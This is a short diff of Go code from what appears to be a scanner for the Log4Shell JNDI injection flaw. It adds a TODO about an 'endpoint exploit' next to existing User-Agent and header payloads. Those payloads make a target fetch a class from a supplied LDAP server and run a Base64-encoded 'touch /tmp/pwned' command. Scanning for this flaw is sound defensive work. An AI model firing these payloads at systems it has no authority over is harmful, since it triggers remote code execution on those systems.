@@ -26,6 +26,7 @@ func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan
 		},
 	}
 
+	// TODO: add endpoint exploit
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
 	log.Debugf("Target URL: %s", targetUrl)
